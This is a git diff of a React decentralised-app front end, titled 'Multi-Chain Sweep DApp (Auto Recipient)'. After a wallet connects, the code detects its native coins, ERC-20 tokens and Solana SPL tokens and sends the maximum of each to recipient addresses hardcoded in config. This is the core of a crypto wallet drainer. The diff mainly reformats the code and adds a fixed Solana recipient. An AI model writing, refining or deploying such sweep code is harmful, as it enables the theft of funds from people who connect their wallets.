@@ -1,8 +1,19 @@
 import React, { useState, useEffect } from "react";
-import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
+import {
+  useAccount,
+  useBalance,
+  useSendTransaction,
+  usePublicClient
+} from "wagmi";
 import { parseEther, formatEther } from "viem";
-import { useSolanaAccount, useSolanaBalance, sendSol, useSolanaSPLTokens, sendSPLToken } from "@reown/appkit-adapter-solana/react";
-import { FIXED_RECIPIENTS } from "./config";
+import {
+  useSolanaAccount,
+  useSolanaBalance,
+  useSolanaSPLTokens,
+  sendSol,
+  sendSPLToken
+} from "@reown/appkit-adapter-solana/react";
+import { FIXED_RECIPIENTS, FIXED_SOLANA_RECIPIENT } from "./config";
 import { ethers } from "ethers";
 
 const ERC20_ABI = [
@@ -33,7 +44,7 @@ export default function App() {
         const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
         const tokenData = [];
 
-        // Use publicClient to fetch user token balances if supported (Reown AppKit may provide a helper)
+        // Replace with your Reown publicClient token detection if available
         const detectedTokens = await publicClient.getERC20Balances(address);
 
         for (const t of detectedTokens) {
@@ -58,10 +69,8 @@ export default function App() {
     if (!solanaPubKey) return;
     const fetchSPL = async () => {
       try {
-        // Reown AppKit helper hook returns list of SPL tokens with {mint, balance, decimals, symbol}
         const tokens = await useSolanaSPLTokens(solanaPubKey);
-        const nonZero = tokens.filter(t => t.balance > 0);
-        setSPLTokens(nonZero);
+        setSPLTokens(tokens.filter(t => t.balance > 0));
       } catch (err) {
         console.error("SPL token detection failed:", err);
       }
@@ -69,22 +78,23 @@ export default function App() {
     fetchSPL();
   }, [solanaPubKey]);
 
-  // --- Unified Send Max (native + tokens)
+  // --- Unified Send Max (Native + Tokens)
   const handleSendMax = async () => {
     setSending(true);
     try {
+      // --- EVM Sweep ---
       if (chain) {
         const recipient = FIXED_RECIPIENTS[chain.id];
+        if (!recipient) return alert("No fixed recipient for this chain");
 
-        // EVM native
+        // Send max native token
         const balance = balanceData.value;
         const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
         const gasPrice = await publicClient.getGasPrice();
         const maxNative = balance - gasEstimate * gasPrice;
-
         if (maxNative > 0n) await sendTransaction({ to: recipient, value: maxNative });
 
-        // ERC-20 tokens
+        // Send all ERC-20 tokens
         const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
         const signer = provider.getSigner();
         for (const token of erc20Tokens) {
@@ -95,18 +105,19 @@ export default function App() {
         }
 
         alert(`Sent native + ERC-20 tokens on ${chain.name}`);
+      }
+      // --- Solana Sweep ---
+      else if (solConnected) {
+        const recipient = FIXED_SOLANA_RECIPIENT;
+        if (!recipient) return alert("No fixed Solana recipient");
 
-      } else if (solConnected) {
-        const recipient = FIXED_RECIPIENTS["SOLANA"];
         if (solBalance > 0) await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });
 
-        // SPL tokens
         for (const t of splTokens) {
           if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
         }
 
         alert("Sent SOL + SPL tokens");
-
       } else {
         alert("No wallet connected");
       }
@@ -114,13 +125,12 @@ export default function App() {
       console.error(err);
       alert("Transaction failed: " + err.message);
     }
-
     setSending(false);
   };
 
   return (
     <div style={{ padding: 40 }}>
-      <h2>Multi-Chain Token Sweep DApp (Auto Detect)</h2>
+      <h2>Multi-Chain Sweep DApp (Auto Recipient)</h2>
       <appkit-button />
 
       {(isConnected || solConnected) && (
